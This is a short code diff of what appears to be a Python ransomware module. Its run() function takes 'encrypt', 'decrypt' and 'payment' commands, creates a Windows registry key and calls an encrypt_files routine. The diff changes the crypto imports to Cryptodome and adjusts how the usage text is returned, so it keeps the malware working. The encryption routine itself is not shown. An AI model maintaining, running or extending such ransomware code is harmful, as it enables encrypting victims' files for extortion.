@@ -7,14 +7,15 @@ import os
 import sys
 import imp
 import json
+import time
 import Queue
 import base64
 import urllib
 import threading
 
 # packages
-import Crypto.PublicKey.RSA
-import Crypto.Cipher.PKCS1_OAEP
+import Cryptodome.PublicKey.RSA
+import Cryptodome.Cipher.PKCS1_OAEP
 if sys.platform == 'win32':
     import _winreg
 
@@ -231,6 +232,7 @@ def run(args=None):
     :param str args:  encrypt, decrypt, payment
 
     """
+    global usage
     if args:
         cmd, _, action = str(args).partition(' ')
         if 'payment' in cmd:
@@ -240,4 +242,4 @@ def run(args=None):
         elif 'encrypt' in cmd:
             reg_key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, registry_key)
             return encrypt_files(action)
-    return globals()['usage']
+    return usage
